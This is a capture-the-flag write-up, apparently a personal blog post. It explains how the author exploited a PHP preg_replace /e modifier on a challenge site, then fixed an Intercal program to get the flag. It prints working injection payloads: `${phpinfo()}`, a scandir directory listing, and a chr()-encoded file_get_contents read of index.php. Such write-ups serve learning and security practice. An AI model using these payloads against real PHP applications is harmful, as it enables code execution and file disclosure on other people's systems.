###A la régulière 

I first fired Burp and tried to inject some code with post request, in the referal. Tried to put an iframe, inject some html or some BBcode... The hint was 'A la régulière' so we know there is some regular expression in place. After some test in the form I did write a regular expression that I believed should be the same:

`[(.+?)](.*)[.+?] `

I had not much experience with escaping regular expressions so I spent some time trying and researching and at the end I don't think it's possible to escape a regular expression like this one.
I ended up putting a string containing all keyboard characters in the form and trying other stuff like &nbsp...
I noticed that everything preceeded by `$` wouldn't get output. Maybe it's interpreted as a PHP variable?
After some more research this time more focussed on PHP I ended up in the [PHP doc for regular expressions](http://php.net/manual/en/reference.pcre.pattern.modifiers.php)
I quickly noticed something about the e modifier (PREG_REPLACE_EVAL) because there is a red warning saying it's been deprecated and the use of this modifier is discouraged because of a security vulnerability.
After some more googling I came up with `${phpinfo()}` and it worked (: code execution \o/
I thought it will only be a matter of printing flag.txt to be done with this challenge but I was wrong...
Every other PHP function I tried to use failed. Except the ones with no arguments like phpingo(). So something wrong with my arguments? Let's encode it then. This is how I printed the directory list using scandir() and print_r() (because scandir() returns an array):

`[H1]${print_r(scandir(chr(46))}[/H1]`

The output:
`->Array ( [0] => . [1] => .. [2] => index.php )`

So no flag.txt... Fuck.
I printed index.html since in seemed to be the only thing to do:


`[H1]${print(file_get_contents(chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(112).chr(104).chr(112)))}[/H1]`

Nothing interesting in the code except this big comment:

So ok... There is a bug in this code and we have to find it. I had no idea which language was that. Turns up it's Intercal-C, some interpreted language. 
There is a nice website called [Ideone](http://ideone.com/) where you can run that code. I learned some stuff about [Intercal](http://progopedia.com/language/intercal/), [Baudot](http://www.cryptomuseum.com/crypto/baudot.htm) code etc and that gave me some understanding of the code. I quickly noticed the bug. There is a missing line before `DO ,1SUB#3 <- #72` that should be `DO ,1SUB#2 <- #??` . The problem is that I didn't find any way to find the missing value manually. Since if you write an Hello World in Intercal the values of the characters are going to be sorted by alphabetical order and other funky stuff like that..Sooooo... I did it manually =D at some point the Intercal programe gave me the flag (:
You could probably write some script to do that. I didn't do it because I had no idea about Intercal interpretor etc so I thought the amount of time spent would be more or less equals. Maybe a smarter way to do it would be to write a little browser macro for Ideone.
